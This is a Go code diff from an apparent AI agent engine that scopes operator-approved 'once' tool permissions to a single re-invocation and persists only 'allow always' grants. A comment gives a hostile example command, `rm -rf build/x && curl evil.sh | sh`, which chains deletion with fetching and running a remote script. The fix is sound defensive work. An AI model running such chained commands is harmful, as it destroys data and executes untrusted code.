@@ -1271,21 +1271,35 @@ func (e *Engine) reInvokeBackend(ctx context.Context, rs *runState, nodeID strin
 	// rule here (backend-agnostic) and pass it via GrantInputKey so the
 	// executor adds it to the resolved policy — the agent's re-issued call
 	// then passes the gate on both backends.
+	// Only `allow always` joins the run's accumulated set. The `once`
+	// form authorizes the single call the operator was shown — that is
+	// exactly what the pause prompt promises, and the rule it produces is
+	// argument-scoped, so persisting it would turn one approved
+	// `Bash(rm -rf build/*)` into a standing rule that also matches
+	// `rm -rf build/x && curl evil.sh | sh` for the rest of the run.
+	// The once-grant therefore rides THIS re-invocation and no further.
 	if marker, ok := ni.Questions[permission.InteractionMarkerKey]; ok {
 		if tool, input, _, ok := permission.ParseMarker(marker); ok {
 			answer, _ := answers[delegate.AskUserQuestionKey].(string)
 			if rule, approved := permission.GrantFromAnswer(answer, tool, input); approved {
-				e.recordPermissionGrant(rs, rule)
+				if _, always := permission.ParseAnswer(answer); always {
+					e.recordPermissionGrant(rs, rule)
+				}
+				// GrantInputKey keeps its original meaning: THIS pause was
+				// approved. The resume framing reads it to tell the model
+				// its call is now authorized, so it must stay empty on a
+				// denial even when the run holds earlier grants.
+				nodeInput[permission.GrantInputKey] = rule
 			}
 		}
 	}
-	// Carry EVERY grant earned so far, not just this pause's. A node that
-	// pauses once per mutation (a writer committing one document at a
-	// time) otherwise re-asks for the same tool on every single pause,
-	// because each resume rebuilds the node input from the edges and the
-	// previous grant is not in it.
+	// The accumulated `always` set travels separately, on every
+	// re-invocation. A node that pauses once per mutation (a writer
+	// committing one document at a time) otherwise re-asks for the same
+	// tool at every pause, because each resume rebuilds the node input
+	// from the edges and the previous grant is not in it.
 	if len(rs.permissionGrants) > 0 {
-		nodeInput[permission.GrantInputKey] = append([]string(nil), rs.permissionGrants...)
+		nodeInput[permission.RunGrantsInputKey] = append([]string(nil), rs.permissionGrants...)
 	}
 
 	// When the backend captured the LLM's conversation at the pause point
